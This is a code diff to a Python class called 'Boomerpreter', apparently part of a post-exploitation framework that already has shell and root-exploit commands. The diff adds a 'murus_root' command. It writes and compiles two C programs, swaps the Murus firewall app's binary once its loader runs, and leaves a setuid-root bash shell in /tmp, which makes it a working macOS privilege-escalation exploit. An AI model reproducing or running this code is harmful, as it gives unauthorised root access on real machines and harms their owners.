@@ -9,6 +9,7 @@ import time
 import threading
 import platform
 import json
+import shutil
 
 try:
     import pty
@@ -35,7 +36,8 @@ class Boomerpreter:
         "shell": "get_shell",
         "root_screen45": "exploit_screen45",
         "check_vuln": "check_vuln",
-        "unquoted_services": "unquoted_services"
+        "unquoted_services": "unquoted_services",
+        "murus_root": "murus_exploit"
         }
         
     
@@ -216,7 +218,72 @@ class Boomerpreter:
             result = "No service with these characteristics has been found"
         
         return result
-        
+    
+    #---------
+    # MacOS
+    #---------
+    def murus_exploit(self, request):
+        file1 = "/tmp/murus411_exp.c"
+        file2 = "/tmp/murus411_exp2.c"
+        try:
+            f1 = open(file1, "wb")
+            f2 = open(file2, "wb")
+
+            f1.write(b"""
+            #include <unistd.h>
+            int main()
+            {
+            setuid(0);
+            seteuid(0);
+            execl("/bin/bash","bash","-c","rm -f /tmp/murus411_exp; /bin/bash",NULL);
+            return 0;
+            }
+            """)
+            f1.close()
+            f2.write(b"""
+            #include <unistd.h>
+            #include <stdlib.h>
+            int main()
+            {
+            setuid(0);
+            seteuid(0);
+            system("chown root:wheel /tmp/murus411_exp");
+            system("chmod 4755 /tmp/murus411_exp");
+            system("mv /Applications/Murus.app/Contents/MacOS/Murus.orig /Applications/\
+            Murus.app/Contents/MacOS/Murus");
+            execl("/Applications/Murus.app/Contents/MacOS/Murus","Murus",NULL);
+            return 0;
+            }
+            """)
+            f2.close()
+
+            os.popen("""
+            gcc /tmp/murus411_exp.c -o /tmp/murus411_exp;
+            gcc /tmp/murus411_exp2.c -o /tmp/murus411_exp2;
+            rm -f %s; rm -f %s;
+            """%(file1, file2))
+        except Exception as e:
+            return str(e)
+        try:
+            while True:
+                data = os.system("ps auxwww | grep '/Applications/Murus.app/Contents/MacOS/MurusLoader' | grep -v grep 1> /dev/null")
+                if data == 0:
+                    break
+                time.sleep(1)
+
+            shutil.move("/Applications/Murus.app/Contents/MacOS/Murus", "/Applications/Murus.app/Contents/MacOS/Murus.orig")
+            shutil.move("/tmp/murus411_exp2", "/Applications/Murus.app/Contents/MacOS/Murus")
+        except Exception as e:
+            return str(e)
+
+        while True:
+            data = subprocess.check_output(["ls", "-la", "/tmp/murus411_exp"])
+            if b"root" in data:
+                break
+            time.sleep(1)
+        return "ok"
+        #system("/tmp/murus411_exp")
+
     # CALL FUNCTIONS END
 
     # AUXILIAR FUNCTIONS BEGIN
